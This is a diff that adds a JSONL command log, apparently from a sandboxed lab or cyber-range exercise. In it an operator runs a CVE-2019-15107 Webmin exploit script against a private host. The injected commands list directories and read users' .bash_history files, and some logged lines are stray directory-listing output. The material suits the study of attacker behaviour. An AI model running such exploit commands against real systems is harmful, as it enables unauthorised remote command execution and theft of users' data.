@@ -1,0 +1,49 @@
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:02:47.398112+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat ./.bash_history'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:03:09.738581+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat home/eva/.bash_history'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:03:16.551711+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat home/bob/.bash_history'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:03:23.060959+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat home/debian/.bash_history'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:03:55.845624+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls home/debian/'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:00.890347+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/debian/'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:09.555998+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:38.619780+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cd /home ; ls'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:53.782506+02:00", "cmd_type": "bash-command", "cmd": "module.info.pt_BR.UTF-8"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:53.815886+02:00", "cmd_type": "bash-command", "cmd": "module.info.ru.UTF-8"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:53.847255+02:00", "cmd_type": "bash-command", "cmd": "module.info.ru_RU"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:53.876533+02:00", "cmd_type": "bash-command", "cmd": "module.info.ru_RU.UTF-8"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:53.902857+02:00", "cmd_type": "bash-command", "cmd": "module.info.ru_SU"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:53.932438+02:00", "cmd_type": "bash-command", "cmd": "module.info.sk"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:53.962965+02:00", "cmd_type": "bash-command", "cmd": "module.info.sk.UTF-8"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:53.990275+02:00", "cmd_type": "bash-command", "cmd": "module.info.sv"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.026234+02:00", "cmd_type": "bash-command", "cmd": "module.info.sv.UTF-8"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.060209+02:00", "cmd_type": "bash-command", "cmd": "module.info.tr"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.090009+02:00", "cmd_type": "bash-command", "cmd": "module.info.zh_CN"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.120905+02:00", "cmd_type": "bash-command", "cmd": "module.info.zh_TW.Big5"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.149718+02:00", "cmd_type": "bash-command", "cmd": "negativeacl"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.176850+02:00", "cmd_type": "bash-command", "cmd": "openssl.cnf"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.204609+02:00", "cmd_type": "bash-command", "cmd": "postinstall.pl"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.234435+02:00", "cmd_type": "bash-command", "cmd": "save_acl.cgi"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.265191+02:00", "cmd_type": "bash-command", "cmd": "save_group.cgi"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.297714+02:00", "cmd_type": "bash-command", "cmd": "save_pass.cgi"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.326466+02:00", "cmd_type": "bash-command", "cmd": "save_sql.cgi"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.358312+02:00", "cmd_type": "bash-command", "cmd": "save_sync.cgi"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.396248+02:00", "cmd_type": "bash-command", "cmd": "save_twofactor.cgi"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.429757+02:00", "cmd_type": "bash-command", "cmd": "save_unix.cgi"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.459805+02:00", "cmd_type": "bash-command", "cmd": "save_user.cgi"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.494395+02:00", "cmd_type": "bash-command", "cmd": "schema.cgi"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.526859+02:00", "cmd_type": "bash-command", "cmd": "switch.cgi"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.558316+02:00", "cmd_type": "bash-command", "cmd": "system_info.pl"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.588925+02:00", "cmd_type": "bash-command", "cmd": "twofactor.pl"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.619956+02:00", "cmd_type": "bash-command", "cmd": "twofactor_form.cgi"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.653726+02:00", "cmd_type": "bash-command", "cmd": "useradmin_update.pl"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:04:54.683870+02:00", "cmd_type": "bash-command", "cmd": "webmin.schema"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:05:14.981752+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cd /home ; ls -la'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:05:26.897851+02:00", "cmd_type": "bash-command", "cmd": "rwxr-xr-x   6 root bin 12288 Jul  4  2019 ."}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:05:26.928036+02:00", "cmd_type": "bash-command", "cmd": "drwxr-xr-x 132 root bin 12288 Jul  4  2019 .."}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:05:26.959801+02:00", "cmd_type": "bash-command", "cmd": "drwxr-xr-x   3 root bin  4096 Jul  4  2019 Authen-SolarisRBAC-0.1"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:05:51.878855+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cd / ; ls -la'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:07:07.930014+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:07:18.067919+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/alice'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:07:27.382170+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/alice'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:07:40.296323+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/debian'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:07:58.469302+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'ls -la /home/eve'"}
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:08:31.941676+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.bash_history'"}
